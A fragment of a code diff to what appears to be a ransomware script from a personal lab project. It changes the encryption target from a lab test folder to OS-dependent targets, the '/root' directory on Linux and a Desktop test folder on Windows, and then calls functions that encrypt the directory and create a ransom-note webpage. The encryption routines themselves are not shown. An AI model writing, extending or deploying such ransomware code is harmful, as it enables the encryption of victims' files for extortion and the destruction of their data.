@@ -86,21 +86,18 @@ def main():
      |_|  \_\  \__,_| |_| |_| |___/  \___/  |_| |_| |_|   \_/\_/    \__,_| |_|     \___| 
     """
     print(ascii_art)
-    #|_|  \_\  \__,_| |_| |_| |___/  \___/  |_| |_| |_|   \_/\_/    \__,_| |_|     \___| 
-    #"""
-    # print(ascii_art)
+    
     # detect os
-    #os_type = platform.system()
-    #if os_type == "Windows":
-    #    target = r"C:\\Users\\%USERNAME%\\Desktop\\Ransomware_Test"
-    #elif os_type == "Linux":
-     #   target = "/root"
-    #else: 
-     #   print("Unsupported OS")
-      #  return
+    os_type = platform.system()
+    if os_type == "Windows":
+        target = r"C:\\Users\\%USERNAME%\\Desktop\\Ransomware_Test"
+    elif os_type == "Linux":
+        target = "/root"
+    else: 
+        print("Unsupported OS")
+        return
     
     # Encrypt the target directory
-    target = "/home/shfana/ransomware-lab/test2"
     if os.path.isdir(target):
         encrypt_directory(target, TOKEN)
         create_ransom_note_webpage(target)
